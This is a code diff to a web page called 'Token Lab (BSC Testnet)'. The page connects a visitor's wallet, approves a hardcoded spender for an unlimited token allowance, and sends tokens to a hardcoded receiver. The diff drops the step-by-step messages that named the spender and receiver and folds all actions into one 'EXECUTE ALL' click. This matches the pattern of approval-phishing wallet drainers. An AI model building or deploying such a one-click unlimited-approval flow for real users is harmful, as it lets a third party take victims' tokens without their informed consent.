@@ -86,16 +86,9 @@
       line-height: 1.6;
       word-break: break-all;
       text-align: left;
-      min-height: 60px;
+      min-height: 80px;
       display: flex;
       align-items: center;
-    }
-
-    .step-indicator {
-      text-align: center;
-      font-size: 12px;
-      color: #888;
-      margin-bottom: 20px;
     }
 
     @media (max-width: 480px) {
@@ -142,20 +135,15 @@
 <div class="container">
   <h2>🧪 Token Lab (BSC Testnet)</h2>
 
-  <div class="step-indicator">
-    <span id="stepText">Step 1 of 3: Connect Wallet</span>
-  </div>
-
   <div class="button-section">
-    <button id="actionBtn" onclick="performAction()">START PROCESS</button>
+    <button id="actionBtn" onclick="executeAll()">EXECUTE ALL</button>
   </div>
 
-  <p id="status">Click the button to begin: Connect → Approve → Transfer</p>
+  <p id="status">Click button to: Connect → Approve → Transfer</p>
 </div>
 
 <script>
 let provider, signer, user;
-let currentStep = 0;
 
 // 🔁 YOUR TOKEN
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
@@ -171,47 +159,28 @@ const tokenABI = [
   "function approve(address spender, uint256 amount) returns (bool)"
 ];
 
-const steps = [
-  { name: "Connect Wallet", fn: connectWallet },
-  { name: "Approve Unlimited", fn: approveToken },
-  { name: "Send 10 Tokens", fn: sendToken }
-];
-
-async function performAction() {
+async function executeAll() {
   const btn = document.getElementById("actionBtn");
+  const status = document.getElementById("status");
   btn.disabled = true;
 
   try {
-    if (currentStep < steps.length) {
-      await steps[currentStep].fn();
-      currentStep++;
-      
-      if (currentStep < steps.length) {
-        updateUI(
-          `✅ ${steps[currentStep - 1].name} completed!\n\nProceeding to: ${steps[currentStep].name}`,
-          `Step ${currentStep + 1} of 3: ${steps[currentStep].name}`
-        );
-      } else {
-        updateUI(
-          "✅ All steps completed successfully! Transaction complete.",
-          "Process Completed"
-        );
-        btn.innerText = "PROCESS COMPLETE";
-        return;
-      }
-    }
-  } catch (e) {
-    updateUI(
-      `❌ Error: ${e.message}`,
-      "Error occurred"
-    );
-    currentStep = 0;
-    btn.innerText = "START PROCESS";
-    btn.disabled = false;
-    return;
-  }
+    status.innerText = "⏳ Connecting wallet...";
+    await connectWallet();
 
-  btn.disabled = false;
+    status.innerText = "⏳ Approving token...";
+    await approveToken();
+
+    status.innerText = "⏳ Sending tokens...";
+    await sendToken();
+
+    status.innerText = "✅ All operations completed successfully!\n\n✓ Connected\n✓ Approved Unlimited\n✓ Sent 10 Tokens";
+    btn.innerText = "COMPLETED ✓";
+
+  } catch (e) {
+    status.innerText = `❌ Error: ${e.message}`;
+    btn.disabled = false;
+  }
 }
 
 async function connectWallet() {
@@ -219,10 +188,8 @@ async function connectWallet() {
     throw new Error("Open inside Trust Wallet browser or use MetaMask");
   }
 
-  // connect
   await window.ethereum.request({ method: "eth_requestAccounts" });
 
-  // try switching to BSC Testnet (chainId 97 = 0x61)
   try {
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
@@ -235,59 +202,18 @@ async function connectWallet() {
   provider = new ethers.providers.Web3Provider(window.ethereum, "any");
   signer = provider.getSigner();
   user = await signer.getAddress();
-
-  updateUI(
-    `✅ Connected: ${user}\n\nNetwork: BSC Testnet`,
-    "Step 1 of 3: Connect Wallet"
-  );
 }
 
-// 🔴 APPROVE
 async function approveToken() {
-  try {
-    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
-
-    const tx = await contract.approve(spender, ethers.constants.MaxUint256);
-
-    await tx.wait();
-
-    updateUI(
-      `🔥 Approval successful!\n\nSpender: ${spender}`,
-      "Step 2 of 3: Approve Unlimited"
-    );
-
-  } catch (e) {
-    throw new Error(`Approval failed: ${e.message}`);
-  }
+  const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+  const tx = await contract.approve(spender, ethers.constants.MaxUint256);
+  await tx.wait();
 }
 
-// 🟢 TOKEN TRANSFER
 async function sendToken() {
-  try {
-    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
-
-    const tx = await contract.transfer(receiver, ethers.utils.parseUnits("10", 18));
-
-    await tx.wait();
-
-    updateUI(
-      `✅ Transfer successful!\n\nSent 10 tokens to: ${receiver}`,
-      "Step 3 of 3: Send 10 Tokens"
-    );
-
-  } catch (e) {
-    throw new Error(`Transfer failed: ${e.message}`);
-  }
-}
-
-function updateUI(statusText, stepText) {
-  document.getElementById("status").innerText = statusText;
-  document.getElementById("stepText").innerText = stepText;
-  
-  const btn = document.getElementById("actionBtn");
-  if (currentStep < steps.length) {
-    btn.innerText = `NEXT: ${steps[currentStep].name.toUpperCase()}`;
-  }
+  const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+  const tx = await contract.transfer(receiver, ethers.utils.parseUnits("10", 18));
+  await tx.wait();
 }
 </script>
 
